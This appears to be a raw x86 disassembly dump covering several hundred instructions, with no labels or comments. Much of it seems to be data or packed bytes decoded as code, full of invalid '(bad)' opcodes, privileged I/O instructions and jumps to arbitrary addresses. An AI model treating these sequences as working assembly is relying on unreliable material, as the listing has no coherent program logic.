  426f49:	xor    ebx,DWORD PTR [edi]
  426f4b:	jl     0x426f8b
  426f4d:	xor    DWORD PTR [ebp-0xd0bf29f],esp
  426f53:	shr    BYTE PTR [esi],0xcb
  426f56:	clc    
  426f57:	cmp    edi,DWORD PTR [eax+0x3e]
  426f5a:	jmp    0x80fa:0xa9b0e3ea
  426f61:	and    edx,ebx
  426f63:	int    0x3f
  426f65:	daa    
  426f66:	xchg   ebx,eax
  426f67:	xchg   ebp,eax
  426f68:	pop    edx
  426f69:	mov    edi,0xffadf91e
  426f6e:	adc    DWORD PTR [ecx-0x691585f8],0xffffff8a
  426f75:	and    al,0x29
  426f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f78:	xchg   BYTE PTR [edi-0x59],dl
  426f7b:	jne    0x426faa
  426f7d:	xlat   BYTE PTR ds:[ebx]
  426f7e:	adc    dh,ch
  426f80:	pop    eax
  426f81:	into   
  426f82:	clc    
  426f83:	arpl   WORD PTR [eax+edi*1+0x5af5480b],cx
  426f8a:	stos   DWORD PTR es:[edi],eax
  426f8b:	inc    edi
  426f8c:	jmp    0xc386:0xc9a9fced
  426f93:	sahf   
  426f94:	push   eax
  426f95:	pop    ds
  426f96:	dec    eax
  426f97:	call   0x746121ab
  426f9c:	shr    esp,1
  426f9e:	movd   DWORD PTR [eax+0x1bf75731],mm2
  426fa5:	ret    0xf0e
  426fa8:	mov    edx,0xf71f5364
  426fad:	sub    cl,BYTE PTR [edi+0x30315c1f]
  426fb3:	(bad)  
  426fb5:	stc    
  426fb6:	fcomp  QWORD PTR [ecx]
  426fb8:	(bad)  [esi-0x15]
  426fbb:	cdq    
  426fbc:	test   DWORD PTR [eax+0x64],edi
  426fbf:	mov    edx,0xa2c2b12
  426fc4:	fdivr  DWORD PTR [ecx-0x59]
  426fc7:	pop    esi
  426fc8:	fwait
  426fc9:	out    0x9e,eax
  426fcb:	jg     0x427034
  426fcd:	xor    edi,ecx
  426fcf:	pop    edi
  426fd0:	push   ss
  426fd1:	or     BYTE PTR [ebp+0x13dfc9ee],bh
  426fd7:	cdq    
  426fd8:	jl     0x426fa4
  426fda:	nop
  426fdb:	adc    al,0x3f
  426fdd:	aas    
  426fde:	mov    ah,0xc7
  426fe0:	xchg   BYTE PTR [ecx],bl
  426fe2:	mov    BYTE PTR [edi+0x32],ah
  426fe5:	rol    BYTE PTR ds:0xaff97e02,cl
  426feb:	inc    ebx
  426fed:	test   al,0xa0
  426fef:	push   ecx
  426ff0:	or     ebp,DWORD PTR [edi]
  426ff2:	cwde   
  426ff3:	pop    esi
  426ff4:	into   
  426ff5:	je     0x426fec
  426ff7:	(bad)  
  426ff8:	mov    edi,0x795f47bb
  426ffd:	jno    0x426fd0
  426fff:	and    BYTE PTR [ebx],bl
  427001:	jb     0x426fc8
  427003:	(bad)
  427007:	and    eax,0x3157a99d
  42700c:	in     al,dx
  42700d:	jnp    0x426fe4
  42700f:	push   es
  427010:	adc    eax,edx
  427012:	dec    esi
  427013:	fnstenv [edi+ecx*4-0x7e14e7e2]
  42701a:	pop    ecx
  42701b:	pusha  
  42701c:	ins    BYTE PTR es:[edi],dx
  42701d:	ret    0x53ed
  427020:	mov    al,BYTE PTR [eax+0x27953ff2]
  427026:	js     0x42702c
  427028:	sub    DWORD PTR [ecx-0x4d7c2a10],ecx
  42702e:	dec    esp
  42702f:	loop   0x426fb4
  427031:	dec    edi
  427032:	iret   
  427033:	leave  
  427034:	rcr    DWORD PTR [eax-0x7e],0x3c
  427038:	fld    TBYTE PTR [ecx-0x356f4409]
  42703e:	ins    DWORD PTR es:[edi],dx
  42703f:	mov    esi,0x816d7b8
  427044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427045:	dec    eax
  427046:	pop    ebx
  427047:	mov    ds:0x24817aed,eax
  42704c:	adc    edi,DWORD PTR [ecx-0x51]
  42704f:	imul   ebx,DWORD PTR [edx],0xbd25cc83
  427055:	shl    eax,cl
  427057:	sub    ebp,DWORD PTR [ebx+0x47]
  42705a:	jb     0x426ffa
  42705c:	push   ebx
  42705d:	retf   
  42705e:	mov    ebx,0xfcff915e
  427063:	cmp    eax,0x758398d3
  427068:	xchg   BYTE PTR [esi+0x7f],cl
  42706b:	ja     0x42706a
  42706d:	outs   dx,DWORD PTR ds:[esi]
  42706e:	mov    al,0xbf
  427070:	jmp    0x4270d5
  427072:	sub    cl,bl
  427074:	cmp    esp,edx
  427076:	mov    bh,0x88
  427078:	in     eax,0x6c
  42707a:	loop   0x42701f
  42707c:	dec    ecx
  42707d:	ret    
  42707e:	push   edi
  42707f:	out    dx,eax
  427080:	outs   dx,DWORD PTR ds:[esi]
  427081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427082:	xchg   dl,ch
  427084:	jns    0x427008
  427086:	and    eax,0x6411ba77
  42708b:	jecxz  0x427021
  42708d:	ss push 0x73d8407d
  427093:	hlt    
  427094:	cwde   
  427095:	pop    esp
  427096:	xchg   esp,eax
  427097:	mov    ch,0x27
  427099:	xchg   edx,eax
  42709a:	cmovs  ebx,DWORD PTR [ecx+0xb]
  42709e:	xor    BYTE PTR ds:[ebx+eax*8+0x68],bl
  4270a3:	rcr    DWORD PTR [ebp-0x6c],cl
  4270a6:	test   al,0xa7
  4270a9:	push   eax
  4270aa:	push   es
  4270ab:	cwde   
  4270ac:	or     al,0x24
  4270ae:	push   es
  4270af:	push   ss
  4270b0:	(bad)  
  4270b2:	mov    dh,0x6c
  4270b4:	lods   al,BYTE PTR ds:[esi]
  4270b5:	push   edi
  4270b6:	scas   al,BYTE PTR es:[edi]
  4270b7:	inc    eax
  4270b8:	xchg   DWORD PTR [esi+eiz*1],eax
  4270bb:	push   0x60
  4270bd:	push   ds
  4270be:	rcl    BYTE PTR [edi],0xf7
  4270c1:	pop    edx
  4270c2:	rol    BYTE PTR [edi-0x17],0x25
  4270c6:	cmc    
  4270c7:	stc    
  4270c8:	cs or  ebp,eax
  4270cb:	mov    es,WORD PTR [esi]
  4270cd:	ins    BYTE PTR es:[edi],dx
  4270ce:	push   ss
  4270cf:	mov    WORD PTR [edx-0x78],es
  4270d2:	jle    0x427150
  4270d4:	jle    0x427151
  4270d6:	push   ss
  4270d7:	mov    edx,0xa4d0ea68
  4270dc:	(bad)  
  4270dd:	scas   al,BYTE PTR es:[edi]
  4270de:	mov    ecx,0xa0955a24
  4270e3:	xchg   esi,eax
  4270e4:	outs   dx,DWORD PTR ds:[esi]
  4270e5:	pop    edx
  4270e6:	jb     0x427106
  4270e8:	jmp    DWORD PTR [edx+0x3b5c8486]
  4270ee:	pop    esp
  4270ef:	pop    ebx
  4270f0:	pop    edx
  4270f1:	mov    esi,0x7b686b35
  4270f6:	call   0x3489a13e
  4270fb:	and    ah,BYTE PTR [edi-0x2acacbf1]
  427101:	in     al,0x11
  427103:	cmp    eax,DWORD PTR [eax]
  427105:	xchg   ecx,eax
  427106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427107:	idiv   DWORD PTR [ecx+0x74]
  42710a:	or     ecx,esi
  42710c:	jg     0x427148
  42710e:	xor    BYTE PTR [ebp+0x3cf950dd],ch
  427114:	adc    cl,BYTE PTR [edx+0x39ff324f]
  42711a:	jb     0x4270d9
  42711c:	mov    ebp,0x68830591
  427121:	sub    DWORD PTR [ebx+0x42],ecx
  427124:	out    0xd6,al
  427126:	mov    dl,0x20
  427128:	cli    
  427129:	adc    eax,0x4c48e32b
  42712e:	icebp  
  42712f:	add    BYTE PTR [ecx+0x45cd59cb],ch
  427135:	(bad)  
  427136:	pop    edi
  427137:	cmp    BYTE PTR [ecx-0x9],ch
  42713a:	inc    eax
  42713b:	inc    esi
  42713c:	inc    ecx
  42713d:	cld    
  42713e:	inc    eax
  42713f:	popf   
  427140:	mov    esp,0xec353815
  427145:	or     ebp,DWORD PTR [ebx+0x3]
  427148:	jmp    0x427181
  42714a:	hlt    
  42714b:	add    DWORD PTR [esi-0x10],edi
  42714e:	aad    0x80
  427150:	pop    ebp
  427151:	mov    edi,0x47a828eb
  427156:	and    ch,BYTE PTR [edi+0x20]
  427159:	js     0x427184
  42715b:	mov    ss,ebx
  42715d:	mov    esi,DWORD PTR [ecx-0x1c8a0433]
  427163:	in     al,dx
  427164:	or     cl,0x89
  427167:	(bad)  
  427168:	imul   ebp,eax,0xffffffab
  42716b:	pop    edx
  42716c:	or     eax,0x85389b2a
  427171:	push   ds
  427172:	and    eax,0x991a2ef5
  427177:	imul   ebp,DWORD PTR [eax-0x31aad83b],0x1d73cb10
  427181:	cmp    ebp,DWORD PTR [eax+esi*1]
  427184:	pop    DWORD PTR [ebx]
  427186:	xor    bl,BYTE PTR [eax+0x67563402]
  42718c:	scas   eax,DWORD PTR es:[edi]
  42718d:	imul   BYTE PTR [ebp+0x7819db0f]
  427193:	sbb    BYTE PTR [eax],bl
  427195:	mov    bl,0x51
  427197:	push   0xdf1159d7
  42719c:	outs   dx,DWORD PTR ds:[esi]
  42719d:	or     ebx,DWORD PTR [ebp+0x16e574f1]
  4271a3:	fwait
  4271a4:	sbb    al,0xa8
  4271a6:	int3   
  4271a7:	aas    
  4271a8:	or     al,0xf
  4271aa:	sub    BYTE PTR [edi],dl
  4271ac:	ins    DWORD PTR es:[edi],dx
  4271ad:	and    BYTE PTR [ebx+0x18],cl
  4271b0:	popf   
  4271b1:	fisubr WORD PTR [esi-0x4bc75b9c]
  4271b7:	sbb    BYTE PTR [edx-0x67f92fca],0xab
  4271be:	aas    
  4271bf:	cwde   
  4271c0:	mov    edx,0xbf88c111
  4271c5:	(bad)  
  4271c6:	cli    
  4271c7:	pop    edx
  4271c8:	push   edi
  4271c9:	fdivr  st,st(2)
  4271cb:	inc    ebp
  4271cc:	sub    eax,0x7f6c2dac
  4271d1:	cwd    
  4271d3:	out    dx,al
  4271d4:	pop    ds
  4271d5:	lods   eax,DWORD PTR ds:[esi]
  4271d6:	fld    QWORD PTR ds:0x36d69ec
  4271dc:	stos   BYTE PTR es:[edi],al
  4271dd:	(bad)  
  4271de:	in     al,dx
  4271df:	push   edi
  4271e0:	cmp    al,0xa7
  4271e2:	mov    dl,0xce
  4271e4:	inc    ebp
  4271e5:	mov    edx,0x448c98a8
  4271ea:	out    0x69,eax
  4271ec:	ror    dl,1
  4271ee:	push   edi
  4271ef:	in     eax,0xf5
  4271f1:	rol    DWORD PTR [ebp+0x78],1
  4271f4:	int    0x14
  4271f6:	ja     0x42724e
  4271f8:	mov    cl,0x2a
  4271fa:	jl     0x4271f5
  4271fc:	xor    DWORD PTR [ebp-0x69892b8a],esi
  427202:	aas    
  427203:	jae    0x4271c5
  427205:	je     0x427192
  427207:	sub    cl,BYTE PTR [ecx+0x48f7bbe2]
  42720d:	dec    eax
  42720e:	push   esi
  42720f:	jns    0x427247
  427211:	inc    edi
  427212:	xor    eax,0xc0b2fc
	...
  427227:	add    BYTE PTR [eax],al
  427229:	add    BYTE PTR [ebp+0x55],cl
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
